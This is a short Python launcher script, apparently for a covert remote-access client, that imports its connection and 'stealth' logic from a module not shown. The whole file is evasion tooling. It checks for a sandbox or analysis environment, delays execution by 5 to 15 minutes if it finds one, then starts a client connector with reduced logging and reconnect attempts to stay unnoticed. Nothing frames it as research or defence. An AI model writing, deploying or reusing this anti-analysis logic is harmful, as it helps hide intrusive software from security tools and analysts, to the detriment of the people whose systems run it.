#!/usr/bin/env python3
"""
Stealth Client Launcher - Minimal footprint version
"""
import sys
import os
import time
import random

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from client import ClientConnector, StealthManager

def stealth_main():
    """Stealthy execution with minimal system impact"""
    
    # Enhanced sandbox detection
    stealth = StealthManager()
    if stealth.check_sandbox():
        # Random delay if sandbox detected
        delay = random.randint(300, 900)  # 5-15 minutes
        print(f"[!] Analysis environment detected - delaying {delay}s")
        time.sleep(delay)
    
    # Initialize client with minimal logging
    client = ClientConnector()
    
    # Reduced reconnect attempts for stealth
    client.max_reconnect_attempts = 5
    
    # Start client
    client.start_client()

if __name__ == "__main__":
    stealth_main()
